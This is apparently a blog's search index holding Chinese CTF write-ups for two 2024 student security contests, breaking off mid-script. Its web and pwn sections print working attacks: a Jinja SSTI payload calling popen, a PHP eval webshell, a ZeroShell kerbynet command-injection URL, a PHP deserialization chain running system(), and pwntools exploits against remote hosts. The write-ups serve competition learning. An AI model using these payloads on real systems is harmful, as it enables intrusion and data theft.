[{"categories":["WP"],"content":"最终总榜 33 web 题这次只能说一言难尽吧 ","date":"2024-12-17","objectID":"/posts/8ead8f3/:0:0","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r1 WEB","date":"2024-12-17","objectID":"/posts/8ead8f3/:1:0","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r1.1 Safe_Proxy不太明白那个 socket 的代理具体是做什么的，可能技术不够吧，最后另辟蹊径，通过判断 post 请求下，SSTI 的回显数据来判断有没有这个类 最后发现在 subclasses 类下的 133 位置可以到 popen ，绕过用字符串拼接就可以，但是好像不出网，就用覆盖 app.py 的方式看执行的内容 最后脚本 import requests r = requests.post(\"http://47.93.188.77:32910/\", data={ \"code\": \"\"\"{{\"\"['_''_class_''_']['_''_bases_''_'][0]['_''_subclasses_''_']()[133]['_''_init_''_']['_''_globals_''_']['pop''en']('cat /flag\u003eapp.py').read()}}\"\"\" }) if 'ok' in r.text: print( requests.get('http://47.93.188.77:32910/').text )","date":"2024-12-17","objectID":"/posts/8ead8f3/:1:1","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r1.2 hello_web进去有个 file 参数，这个一看就是任意文件读取，但是好像读取有限制，最后测试发现 ..././ 可以成功读到上级目录 读取后发现 tips.php 是 phpinfo 页面，hackme.php 是一个混淆内容 下载到本地解混淆,修改成这样，直接看数据 \u003c?php highlight_file(__FILE__); $lJbGIY = \"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME\"; $OlWYMv = \"zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel\"; $lapUCm = urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"); $YwzIst = $lapUCm{3} . $lapUCm{6} . $lapUCm{33} . $lapUCm{30}; $OxirhK = $lapUCm{33} . $lapUCm{10} . $lapUCm{24} . $lapUCm{10} . $lapUCm{24}; $YpAUWC = $OxirhK{0} . $lapUCm{18} . $lapUCm{3} . $OxirhK{0} . $OxirhK{1} . $lapUCm{24}; $rVkKjU = $lapUCm{7} . $lapUCm{13}; $YwzIst .= $lapUCm{22} . $lapUCm{36} . $lapUCm{29} . $lapUCm{26} . $lapUCm{30} . $lapUCm{32} . $lapUCm{35} . $lapUCm{26} . $lapUCm{30}; //eval($YwzIst(\"JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==\")); $uWcdaA=\"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==\";echo('?\u003e'.$YwzIst($OxirhK($YpAUWC($uWcdaA,$rVkKjU*2),$YpAUWC($uWcdaA,$rVkKjU,$rVkKjU),$YpAUWC($uWcdaA,0,$rVkKjU)))); echo ($OxirhK($YpAUWC($uWcdaA,$rVkKjU*2),$YpAUWC($uWcdaA,$rVkKjU,$rVkKjU),$YpAUWC($uWcdaA,0,$rVkKjU))); ?\u003e PD9waHAgQGV2YWwoJF9QT1NUWydjbWRfNjYuOTknXSk7ID8+Cg== base64 解密后就是命令执行 \u003c?php @eval($_POST['cmd_66.99']); ?\u003e 这个绕过用 cmd[66.99 即可 但是在蚁剑连接后，有 ret=127 拒绝，才发现 phpinfo 中禁止了一些函数，没法执行，用蚁剑插件来绕过 最后用命令找到 flag find / -name flag; cat /run/log/78dc830da302d4c30d5f33be499c8992/flag;","date":"2024-12-17","objectID":"/posts/8ead8f3/:1:2","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2 威胁检测与网络流量分析","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:0","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.1 zeroshell_1用工具 ctfNetA 一把梭，匹配到关键 base64 参数，直接解密就是 flag ","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:1","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.2 zeroshell_2本地部署后，用通杀洞直接 rce 即可 http://61.139.2.100/cgi-bin/kerbynet?Action=x509view\u0026Section=NoAuthREQ\u0026User=\u0026x509type=%27%0A(cat%20/Database/flag)%0A%27","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:2","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.3 zeroshell_3题目提示 受控机防火墙 ,发现在 /Database 文件夹中存在 .nginx 文件，通过脚本下载 import requests r = requests.get(\"http://61.139.2.100/cgi-bin/kerbynet?Action=x509view\u0026Section=NoAuthREQ\u0026User=\u0026x509type=%27%0A(cat%20/Database/.nginx)%0A%27\") with open(\"nginx.pem\", \"wb\") as f: f.write(r.content)下载后发现是 elf 文件，用 ida 进行分析 查看字符串发现一个 ip 地址，就是反连地址 flag{202.115.89.103}","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:3","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.4 zeroshell_4上一题下载的 .nginx 文件就是 flag{.nginx}","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:4","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.5 zeroshell_5在 ida 中 ip 的下方，有一个看着很像 key 的字符串 尝试提交发现正确 flag{11223344qweasdzxc}","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:5","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.6 WinFT_1在定时任务中找到一个名为 flvupdate.exe 的程序，使用沙箱分析发现是木马程序，并对外做了连接，连接域名为 miscsecure.com 然后通过虚拟机中的火绒剑分析 flvupdate.exe 程序的网络行为，发现其会连接 192.168.116.130:443 地址，所以最终 flag 拼接即可 flag{miscsecure.com:192.168.116.130:443}","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:6","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.7 WinFT_2在任务计划的 DriverUpdates 计划中存在计划描述 base64 解密后就是 flag ","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:7","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.8 WinFT_5在恶意流量包中，发现 client 字段的请求的响应内容存在压缩包特征，且有个对应的 server 请求，将两个请求进行拼接，可以得到一个完整的压缩包，但是存在密码 压缩包中存在注释，base64 解密后就是密码: 时间线关联非常重要 flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:8","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r2.9 kiwi看一下流量包，找响应码为 200 的流量，看一下响应内容有一串加密的字符串，掐头去尾 ida启动看一下，很明显是 mimikatz 在下面的 sub_140082974 里找到了加密逻辑 先置一个算法生成的随机数种子，调试可得到是固定的 0x69 然后用循环每位先异或 seed，然后在加上随机数 最后这里是一个换表 base64 d+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg/PTrohxluiJCRIYAyH6N4aKO9 cyberchef处理一下base64 最后写个解密解一下就好了 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main() { srand(0x69); unsigned char data[] = {0xb9,0x48,0x1c,0x58,0x81,0x4f,0x51,0x7d,0x27,0x70,0x33,0x6f,0x79,0x48,0x82,0x21,0x08,0x80,0x79,0x49,0x51,0x52,0x28,0x9b,0x7d,0xbb,0x40,0x67,0x45,0x7a,0x96,0x38,0x3e,0x7d,0x41,0x42,0x86,0x60,0x4f,0x6c,0x3b,0x87,0x2e,0x26,0x72,0x51,0x83,0x80,0x79,0xbd,0x79,0x40,0x67,0x71,0x4a,0xa2,0x98,0x76,0x3a,0x8f,0x68,0xda,0x7f,0x74,0x2a,0x33,0x55,0x8d,0x5e,0x2b,0x39,0x6d,0xbe,0x5f,0x74,0x74,0x7d,0x11,0x8e,0x4b,0x4d,0x99,0x64,0x79,0x63,0xb3,0x73,0xca,0x31,0x90,0xc3,0x77,0x1b,0x6f,0x61,0x52,0x11,0xbc,0xbd,0x86,0xb2,0x78,0x4f,0x7e,0x56,0x8f,0x6c,0x94,0xb4,0x3a,0x7f,0x14,0x4b,0x79,0xb6,0x8c,0xb0,0xad,0x8b,0x67,0x6d,0xd1,0x7a,0x9a,0xa7,0x31,0x74,0x25,0x3e,0x61,0x2e,0x82,0x3d,0x63,0x5e,0x77,0x6b,0x7c,0x3f,0x24,0x65,0x35,0x9f,0x53,0x84,0x92,0x42,0xa0,0x7d,0x66,0x70,0x3b,0xd3,0x65,0xa2,0x6d,0x7f,0x19,0x92,0x7a,0x8c,0xb8,0x6b,0x12,0x18,0x66,0x74,0xc0,0x48,0x64,0x9d,0x0e,0x6f,0x53,0x96,0x49,0x61,0x5d}; for (size_t i = 0; i \u003c sizeof(data); i++) { data[i] -= rand() % 128; data[i] = data[i] ^ 0x69; } printf(\"%s\\n\", data); } /* User=Administrator NTLM= User=DefaultAccount NTLM= User=Guest NTLM= User=Lihua NTLM=23d1e086b85cc18587bbc8c33adefe07 User=WDAGUtilityAccount NTLM=d3280b38985c05214dcc81b74dd98b4f */最后到在线网站解一下 ","date":"2024-12-17","objectID":"/posts/8ead8f3/:2:9","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r3 Reverse","date":"2024-12-17","objectID":"/posts/8ead8f3/:3:0","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r3.1 dump把全字符作为参数，传入程序中，将程序返回的数据作为键，全字符数据作为值，写出以下脚本 import base64 b=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^\u0026*()_+-={}[]\" a=bytes.fromhex(\"1e1f202122232425262728292a2b2c2d2e2f303132333435363702030405060708090a0b0c0d0e0f101112131415161718191a1b001c1d00000000000000000000000000000000000000000138390000\") f=base64.b64decode(b\"IykeJDgOFSA3DgUgAA43Eh0PJAEBOQ==\") e=\"\" for i in f: e+=b[a.find(bytes([i]))] print(e);","date":"2024-12-17","objectID":"/posts/8ead8f3/:3:1","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r3.2 ezCskyida 无法分析程序，但通过程序中残留的符号可以知道程序进行了一次 rc4 和一次 xor 在程序 rodata 段可以发现字符串数据与密文数据，在附近可以发现疑似rc4key的字符串 \"testkey\" 对密文进行 rc4 解密得到 0a 0d 06 1c 1f 54 56 53 57 51 00 03 1d 14 58 56 03 19 1c 00 54 03 4b 14 58 07 02 49 4c 02 07 01 51 0c 08 00 01 00 03 00 4f 7d看到解密之后的数据结尾为 0x7d 为 } 将字符串开头异或flag ： 0a 0d 06 1c^flag 得到lag{ 所以猜测xor加密就是将flag[i]^flag[i+1] 根据猜测写脚本 a=[10, 13, 6, 28, 31, 84, 86, 83, 87, 81, 0, 3, 29, 20, 88, 86, 3, 25, 28, 0, 84, 3, 75, 20, 88, 7, 2, 73, 76, 2, 7, 1, 81, 12, 8, 0, 1, 0, 3, 0, 79, 125] for i in range(len(a)-2,-1,-1): a[i]=a[i]^a[i+1] \"\"\" flag{d0f5b330-9a74-11ef-9afd-acde48001122} \"\"\"","date":"2024-12-17","objectID":"/posts/8ead8f3/:3:2","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r4 Pwn","date":"2024-12-17","objectID":"/posts/8ead8f3/:4:0","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r4.1 anotefrom pwn import * backdoor=0x80489CE #p=process(\"./note\") #pause() p=remote(\"47.94.108.51\",\"24633\") for i in range(9): p.sendlineafter('\u003e\u003e','1') p.sendlineafter(b'\u003e\u003e',b'2') p.sendlineafter(b'index:',b'7') p.readuntil('gift:') d=int(p.readline(),16) print(hex(d)) p.sendlineafter(b'\u003e\u003e',b'3') p.sendlineafter(b'index:',b'7') p.sendlineafter(b'len',b'40') payload=p32(0x80489ce)+b'a'*0x10+b'abcd'+p32(d+8) p.sendlineafter(b'content:',payload) p.sendlineafter(b'\u003e\u003e',b'3') p.sendlineafter(b'index:',b'8') p.sendlineafter(b'len',b'3') p.sendline('1') p.interactive()","date":"2024-12-17","objectID":"/posts/8ead8f3/:4:1","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"\r4.2 avmcode 内容如下 load r2,r1,0xd38\rload r3,r1,0x320\radd r3,r2,r3\rload r4,r1,0x328\rsub r4,r2,r4\rload r5,r1,0x330\radd r5,r4,r5\rload r6,r1,0x338\radd r6,r4,r6\rload r7,r1,0x340\radd r7,r4,r7\rstore r7,r1,0xd38\rstore r6,r1,0xd40\rstore r5,r1,0xd48\rstore r3,r1,0xd50脚本如下 from pwn import * signs=['add','sub','mul','div','xor','and','sal','sar','store','load'] def parsereg(arg): return int(arg[1:]) def parsevalue(arg): return int(arg,16) def parsearg(arg1,arg2,arg3): status=0 if (arg1[0]=='r'): arg1_v=parsereg(arg1) else: arg1_v=parsevalue(arg1) if (arg2[0]=='r'): arg2_v=parsereg(arg2) else: arg2_v=parsevalue(arg2) if arg3[0]!='r': arg3_v=parsevalue(arg3) else: arg3_v=parsereg(arg3) value=((arg1_v\u00260x1f))|((arg2_v\u00260x1f)\u003c\u003c5) value=value|(arg3_v\u003c\u003c16) return value\u00260xfffffff; def compile(sign): if (sign.strip()==''): return b'' op_sign=sign.split(' ')[0] arg=sign[sign.find(' ')+1:] print(arg.count(',')) if arg.count(',')==2: arg1,arg2,arg3=arg.split(',') else: arg1,arg2=arg.split(',') arg3=None opcodenum=((signs.index(op_sign)+1)\u003c\u003c28)|parsearg(arg1,arg2,arg3) return p32(opcodenum) d=open(\"code\").read().splitlines() payload=b'' for i in d: payload+=compile(i) payload=payload.ljust(0x200,b'\\x00') payload+=p64(0x26fe0)+p64(0x29d90)+p64(0x1d8678)+p64(0x2a3e5)+p64(0x29139) #p=process(\"./pwn\") p=remote('39.105.123.22','22545') #gdb.attach(p,'bp $rebase(0x1AFB)') pause() p.sendafter('opcode: ',payload) p.interactive()","date":"2024-12-17","objectID":"/posts/8ead8f3/:4:2","tags":["WP"],"title":"2024年第十八届全国大学生信息安全竞赛（长城杯）WP","uri":"/posts/8ead8f3/"},{"categories":["WP"],"content":"总榜第一，被队友带飞了，也算圆满最后一届的浙江省大学生竞赛了，非常感谢队友 我们,是冠军！！！ ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:0:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r1 web","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:1:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r1.1 wucanrce\u003c?php echo \"get只接受code欧,flag在上一级目录\u003cbr\u003e\"; $filename = __FILE__; highlight_file($filename); if(isset($_GET['code'])){ if (!preg_match('/session_id\\(|readfile\\(/i', $_GET['code'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['code'])) { @eval($_GET['code']); } } else{ die(\"不让用session欧，readfile也不行\"); } } ?\u003e 无参rce //查看上一级目录文件名 print_r(scandir(dirname(getcwd()))); //读取上级目录文件 show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:1:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r1.2 unserialize\u003c?php highlight_file(__FILE__); error_reporting(0); class AAA{ public $aear; public $string; public function __construct($a){ $this -\u003e aear = $a; } function __destruct() { echo $this -\u003e aear; } public function __toString() { $new = $this -\u003e string; return $new(); } } class BBB { private $pop; public function __construct($string) { $this -\u003e pop = $string; } public function __get($value) { $var = $this -\u003e $value; $var[$value](); } } class DDD{ public $bag; public $magazine; public function __toString() { $length = @$this -\u003e bag -\u003e add(); return $length; } public function __set($arg1,$arg2) { if($this -\u003e magazine -\u003e tower) { echo \"really??\"; } } } class EEE{ public $d=array(); public $e; public $f; public function __get($arg1){ $this-\u003ed[$this-\u003ee]=1; if ($this-\u003ed[]=1){ echo 'nononononnnn!!!'; } else{ eval($this-\u003ef); } } } class FFF{ protected $cookie; protected function delete() { return $this -\u003e cookie; } public function __call($func, $args) { echo 'hahahhhh'; call_user_func([$this, $func.\"haha\"], $args); } } class GGG{ public $green; public $book; public function __invoke(){ if(md5(md5($this -\u003e book)) == 666) { return $this -\u003e green -\u003e pen; } } } if(isset($_POST['UP'])) { unserialize($_POST['UP']); }反序列化 调用路径： AAA::__destruct--\u003eAAA::__toString--\u003eGGG::__invoke--\u003eEEE::__get 其中到GGG的时候需要爆破一下md5 # -*- coding: utf-8 -*- import multiprocessing import hashlib import random import string import sys CHARS = string.letters + string.digits def cmp_md5(substr, stop_event, str_len, start=0, size=20): global CHARS while not stop_event.is_set(): rnds = ''.join(random.choice(CHARS) for _ in range(size)) md5 = hashlib.md5(rnds) md5 = hashlib.md5(md5.hexdigest()) if md5.hexdigest()[start: start+str_len] == substr and md5.hexdigest()[3].isdigit()==False: print rnds stop_event.set() if __name__ == '__main__': substr = sys.argv[1].strip() start_pos = int(sys.argv[2]) if len(sys.argv) \u003e 1 else 0 str_len = len(substr) cpus = multiprocessing.cpu_count() stop_event = multiprocessing.Event() processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)] for p in processes: p.start() for p in processes: p.join() EEE中的if用报错跳过即可 exp： \u003c?php class GGG{ public $green; public $book='g1xFqZRDDTyxafSIUSta'; } class AAA{ public $aear; public $string; } class EEE{ public $d=1; public $e; public $f=\"system('cat /flag.txt');\"; } $a = new AAA(); $a-\u003eaear = new AAA(); $a-\u003eaear-\u003estring = new GGG(); $a-\u003eaear-\u003estring-\u003egreen = new EEE(); echo urlencode(serialize($a)); //O%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A3%3A%22GGG%22%3A2%3A%7Bs%3A5%3A%22green%22%3BO%3A3%3A%22EEE%22%3A3%3A%7Bs%3A1%3A%22d%22%3Bi%3A1%3Bs%3A1%3A%22e%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A24%3A%22system%28%27cat+%2Fflag.txt%27%29%3B%22%3B%7Ds%3A4%3A%22book%22%3Bs%3A20%3A%22g1xFqZRDDTyxafSIUSta%22%3B%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:1:2","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r2 misc","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:2:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r2.1 FinalSign附件是一个txt，存在snow特征，有大量的20，09 用得到的keyhelloworld去xor txt中的字符串 a=bytes.fromhex('2c243f2f3b3114345d0a0909333f06100143023b2c55020912') key=b'helloworld' e=[] for i in range(0,len(a)): e.append(a[i]^key[i%len(key)]) print(bytes(e)) #b'DASCTF{F1nal_Sign1n_D0ne}'","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:2:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r2.2 非黑即白反转文件，得到一张gif with open('非黑即白','rb') as f: with open('1.gif','wb') as g: g.write(f.read()[::-1])将纯黑色的帧转为0，其他的转为1，得到一个加密的zip from PIL import Image a=Image.open(\"1.gif\") n=0 data=\"\" e=[] while True: try: a.seek(n) d=a.copy().convert('1').getdata() if (d[0]==0): data+='0' else: data+='1' except: break; if (len(data)==8): e.append(int(data,2)) data='' n+=1 f=open(\"data.zip\",'wb') f.write(bytes(e)) f.close()identify查看帧间隔，发现前几帧的间隔不一致，提取出来转成字符串 root@lewiserii:~# identify -format \"%s %T \\n\" 2.gif 0 118 1 106 2 69 3 74 4 48 5 98 6 83 7 117 8 77 9 79 10 86 11 65 12 90 13 103 14 101a=[118,106,69,74,48,98,83,117,77,79,86,65,90,103,101] print(bytes(a)) #b'vjEJ0bSuMOVAZge'解压得到flag DASCTF{H3r3_1s_C0L0rful_W0rld} ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:2:2","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r2.3 天命人按照黑猴的章节名排序 火照黑云 风起黄昏 夜生白露 曲度紫鸳 日落红尘 未竟发现按照顺序取一个字节是50 4b 03 04 00 0a python提取出来 file_list = ['火照黑云', '风起黄昏', '夜生白露', '曲度紫鸳', '日落红尘', '未竟'] sources = [open(file_name, 'rb') for file_name in file_list] n = 0 with open('1.zip', 'wb') as target: while n \u003c 0x5ead4: bytes_read = [source.read(1) for source in sources] for byte in bytes_read: if byte: target.write(byte) n += 17-zip打开可以看到另一个zip 其中 根器.zip 很明显进行crc32爆破 C:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破\u003epython crc32.py reverse 0x76899D01 4 bytes: C0M3 {0x43, 0x30, 0x4d, 0x33} verification checksum: 0x76899d01 (OK) C:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破\u003epython crc32.py reverse 0x8E036AA6 4 bytes: _4ND {0x5f, 0x34, 0x4e, 0x44} verification checksum: 0x8e036aa6 (OK) C:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破\u003epython crc32.py reverse 0x881D716A 4 bytes: _Get {0x5f, 0x47, 0x65, 0x74} verification checksum: 0x881d716a (OK) C:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破\u003epython crc32.py reverse 0x7F3D8E75 4 bytes: _S1X {0x5f, 0x53, 0x31, 0x58} verification checksum: 0x7f3d8e75 (OK) C:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破\u003epython crc32.py reverse 0x248D3C69 4 bytes: _R00 {0x5f, 0x52, 0x30, 0x30} verification checksum: 0x248d3c69 (OK) C:\\Users\\lewiserii\\Desktop\\脚本\\crc32碰撞\\压缩包crc32爆破\u003epython crc32.py reverse 0xCB27D2BD 4 bytes: TS!! {0x54, 0x53, 0x21, 0x21} verification checksum: 0xcb27d2bd (OK)得到密码C0M3_4ND_Get_S1X_R00TS!!，解密 未竟.zip 提取金箍棒.png上的像素点 from PIL import Image a = Image.open(\"金箍棒.png\") x, y = 5, 5 x_, y_ = 0, 0 w, h = a.size b = Image.new(a.mode, (w // 10, h // 10)) for x in range(5, w, 10): for y in range(5, h, 10): print(x, y, x_, y_) b.putpixel((x_, y_), a.getpixel((x, y))) y_ += 1 x_ += 1 y_ = 0 b.save('1.png')得到verapass1:jinggubang 用照片作为密钥文件同时使用密码挂载得到flag DASCTF{T1m3_t0_F4Ce_De5t1nY} ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:2:3","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r3 reverse","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:3:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r3.1 Reverse2upx 加密，但抹了特征，修改一下就行 然后用命令解密 upx -d Reverse2.exe打开就是 base64 换表 ","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:3:1","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r3.2 Reverse1先使用标准rc4加密密钥 之后使用魔改的rc4加密明文 class rc4(): def toBytes(self,data): if type(data)==str: return data.encode() elif type(data)==bytes: return data else: raise Exception(\"data Type Error\") def GetKey(self,data): k=[] k1=[] data_l=len(data) for i in range(256): k.append(i) k1.append(data[i%data_l]) n=0 for i in range(256): n=(k1[i]+n+k[i])\u00260xff n1=k[i] k[i]=k[n] k[n]=n1 return k def Cipher(self,data): data=self.toBytes(data) enc=[] k=self.Key.copy() n=0 n1=0 tmp=0 for i in range(len(data)): n=(n+1)\u00260xff n1=(n1+k[n])\u00260xff tmp=k[n] k[n]=k[n1] k[n1]=tmp enc.append((data[i]+k[(k[n]+k[n1])%256])\u00260xff) return bytes(enc) def __init__(self,key): key=self.toBytes(key) self.Key=self.GetKey(key) self.__Key=key def SetKey(self,key): key=self.toBytes(key) self.Key=self.GetKey(key) self.__Key=key k=bytes.fromhex(\"690d5ab240ea193f2f6a\") d=[0x4E, 0x47, 0x38, 0x47, 0x62, 0x0A, 0x79, 0x6A, 0x03, 0x66, 0xC0, 0x69, 0x8D, 0x1C, 0x84, 0x0F, 0x54, 0x4A, 0x3B, 0x08, 0xE3, 0x30, 0x4F, 0xB9, 0x6C, 0xAB, 0x36, 0x24, 0x52, 0x81, 0xCF] r=rc4(bytes(k)) e=r.Cipher(bytes(d)) print(e)","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:3:2","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r4 pwn","date":"2024-11-10","objectID":"/posts/5a1f13a3088db7e24b55207320a2fda9/:4:0","tags":["比赛","WP"],"title":"第七届浙江省大学生网络与信息安全竞赛决赛WP","uri":"/posts/5a1f13a3088db7e24b55207320a2fda9/"},{"categories":["WP"],"content":"\r4.1 ezPwn直接利用tcache bin在0x4180地址处创建chunk，并写入构造好的数据，就可以获取flag from pwn import * context.arch='amd64' def add(size,data=b'\\n'): p.sendlineafter(b'exit',b'1') p.sendlineafter(b\"size\u003e\u003e\",str(size).encode()) p.sendafter(\"data\u003e\u003e\",data) def edit(ind,data): p.sendlineafter(b'exit',b'2') p.sendlineafter(b'index\u003e\u003e',str(ind).encode()) p.sendafter(\"data\u003e\u003e\",data) def show(ind): p.sendlineafter(b'exit',b'3') p.sendlineafter(b'index\u003e\u003e',str(ind).encode()) p.readuntil(b'data\u003e\u003e\\n') def free(ind): p.sendlineafter(b'exit',b'4') p.sendlineafter(b'index\u003e\u003e',str(ind).encode()) def exit(): p.sendlineafter(b'exit',b'5') def getflag(): p.sendlineafter(b'exit',b'6') def 